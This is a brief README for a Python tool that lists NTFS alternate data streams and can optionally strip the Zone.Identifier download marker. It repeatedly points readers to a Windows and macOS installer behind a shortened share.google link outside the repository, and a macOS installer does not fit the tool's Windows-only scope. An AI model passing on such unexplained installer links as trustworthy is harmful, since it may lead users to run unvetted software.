![NTFS ADS List](assets/hero.png)

# NTFS ADS List

*See Zone.Identifier and other streams.*

## About

**NTFS ADS List** runs on your own PC. List NTFS alternate data streams under a folder.

Downloaded files carry a Zone.Identifier that some tools trip on.

Point it at a path, preview the plan if you want, then write the result next to the source or to `--out`.

## What's included

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Highlights

- Stream name and size
- Folder walk
- Optional strip Zone.Identifier
- Preview first

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/kell-carter606/ntfs-ads-list

MIT license. See `LICENSE`.
